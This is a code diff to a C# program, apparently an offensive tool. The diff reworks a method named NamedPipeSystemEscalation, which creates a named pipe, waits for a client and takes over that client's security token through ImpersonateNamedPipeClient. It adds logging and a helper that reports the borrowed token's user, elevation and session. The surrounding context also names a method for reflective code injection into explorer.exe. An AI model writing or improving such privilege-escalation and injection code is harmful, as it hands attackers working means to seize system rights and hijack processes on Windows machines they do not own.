@@ -182,34 +182,127 @@ public class Program
         }
     }
 
-    private static void NamedPipeSystemEscalation()
+private static void NamedPipeSystemEscalation()
+{
+    IntPtr hPipe = IntPtr.Zero;
+    try
     {
-        IntPtr hPipe = IntPtr.Zero;
-        try
-        {
-            string pipeName = @"\\.\pipe\x0xr00t_kiss";
-            hPipe = CreateNamedPipe(
-                pipeName,
-                PIPE_ACCESS_DUPLEX,
-                PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
-                1,
-                1024,
-                1024,
-                0,
-                IntPtr.Zero);
+        string pipeName = @"\\.\pipe\x0xr00t_kiss";
+        hPipe = CreateNamedPipe(
+            pipeName,
+            PIPE_ACCESS_DUPLEX,
+            PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
+            1,
+            1024,
+            1024,
+            0,
+            IntPtr.Zero);
 
-            if (hPipe != IntPtr.Zero && hPipe.ToInt64() != -1)
-            {
-                ConnectNamedPipe(hPipe, IntPtr.Zero);
-                ImpersonateNamedPipeClient(hPipe);
-            }
-        }
-        catch { }
-        finally
+        if (hPipe != IntPtr.Zero && hPipe.ToInt64() != -1)
         {
-            if (hPipe != IntPtr.Zero) CloseHandle(hPipe);
+            // --- extension: log where the silent version would silently fail ---
+            Console.WriteLine("[pipe] created, waiting for a client to connect...");
+
+            if (!ConnectNamedPipe(hPipe, IntPtr.Zero))
+            {
+                int gle = Marshal.GetLastWin32Error();
+                if (gle == ERROR_PIPE_CONNECTED)
+                    Console.WriteLine("[pipe] client already connected before our call");
+                else
+                {
+                    Console.WriteLine($"[pipe] ConnectNamedPipe failed, GLE={gle}");
+                    return;
+                }
+            }
+
+            Console.WriteLine("[pipe] client connected");
+
+            // Read what the client sent: proves the pipe session is live
+            // before we try to adopt its token.
+            byte[] buf = new byte[256];
+            if (ReadFile(hPipe, buf, (uint)buf.Length, out uint read, IntPtr.Zero))
+                Console.WriteLine($"[pipe] client wrote {read} bytes: " +
+                    Encoding.UTF8.GetString(buf, 0, (int)read).Trim());
+            else
+                Console.WriteLine($"[pipe] ReadFile failed/GLE={Marshal.GetLastWin32Error()} " +
+                    "(client may have only opened and closed)");
+
+            if (!ImpersonateNamedPipeClient(hPipe))
+            {
+                Console.WriteLine($"[pipe] ImpersonateNamedPipeClient failed, " +
+                    $"GLE={Marshal.GetLastWin32Error()}");
+                return;
+            }
+
+            // --- extension: show whose token the thread now carries ---
+            DumpThreadToken("[pipe] token now on thread");
+        }
+        else
+        {
+            Console.WriteLine($"[pipe] CreateNamedPipe failed, GLE={Marshal.GetLastWin32Error()}");
         }
     }
+    catch (Exception ex)
+    {
+        Console.WriteLine($"[pipe] exception: {ex.GetType().Name}: {ex.Message}");
+    }
+    finally
+    {
+        // Detach from the borrowed token first — without this the thread keeps
+        // running with the client's credentials after the method returns.
+        RevertToSelf();
+        if (hPipe != IntPtr.Zero) CloseHandle(hPipe);
+        Console.WriteLine("[pipe] reverted + handle closed");
+    }
+}
+
+// --- extension helper: dump the thread's current token (user / elevation / session) ---
+private static void DumpThreadToken(string prefix)
+{
+    const uint TOKEN_QUERY = 0x0008;
+    if (!OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, true, out IntPtr hTok))
+    {
+        Console.WriteLine($"{prefix}: (no impersonation token on thread, GLE=" +
+            $"{Marshal.GetLastWin32Error()}) running as {Environment.UserDomainName}" +
+            $"\\{Environment.UserName}");
+        return;
+    }
+    try
+    {
+        // TokenUser=1, TokenElevation=20, TokenSessionId=12
+        GetTokenInformation(hTok, 1, IntPtr.Zero, 0, out uint need);
+        IntPtr p = Marshal.AllocHGlobal((int)need);
+        string user;
+        try
+        {
+            if (!GetTokenInformation(hTok, 1, p, need, out _)) { user = "<query failed>"; goto done; }
+            IntPtr sid = Marshal.ReadIntPtr(p);
+            var name = new StringBuilder(256); var dom = new StringBuilder(256);
+            uint cn = 256, cd = 256;
+            user = LookupAccountSid(null, sid, name, ref cn, dom, ref cd, out _)
+                ? $"{dom}\\{name}" : "<lookup failed>";
+        done:;
+        }
+        finally { Marshal.FreeHGlobal(p); }
+
+        bool elevated = TokenDword(hTok, 20) != 0;
+        uint session   = TokenDword(hTok, 12);
+        Console.WriteLine($"{prefix}: user={user}, elevated={elevated}, session={session}");
+    }
+    finally { CloseHandle(hTok); }
+}
+
+private static uint TokenDword(IntPtr hTok, int infoClass)
+{
+    GetTokenInformation(hTok, infoClass, IntPtr.Zero, 0, out uint need);
+    IntPtr p = Marshal.AllocHGlobal((int)need);
+    try
+    {
+        return GetTokenInformation(hTok, infoClass, p, need, out _)
+            ? (uint)Marshal.ReadInt32(p) : 0;
+    }
+    finally { Marshal.FreeHGlobal(p); }
+}
 
     private static void ReflectiveInjectIntoExplorer(byte[] code)
     {
